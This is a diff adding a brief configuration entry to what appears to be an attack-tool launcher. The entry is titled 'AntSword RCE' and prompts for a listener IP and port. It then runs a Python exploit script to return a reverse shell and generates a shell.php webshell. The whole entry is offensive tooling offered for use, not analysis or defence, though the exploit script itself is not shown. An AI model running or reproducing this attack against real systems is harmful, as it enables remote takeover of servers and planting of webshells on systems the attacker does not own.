@@ -1,0 +1,16 @@
+<sfjt>inject</sfjt>
+<cs1mc>IP</cs1mc>
+<cs2mc>PORT</cs2mc>
+
+<zbz>2</zbz>
+<bz1fk>[+] Payload being generated...</bz1fk>
+<bz1>
+<cmd>python yijian-rce.py <cs1/> <cs2/></cmd>
+</bz1>
+<bz2>
+<cmd>echo [+] shell.php has been generated under the user's desktop</cmd>
+</bz2>
+
+<bz>蚁剑RCE
+反弹回一个shell，请输入你的监听IP和端口
+</bz>
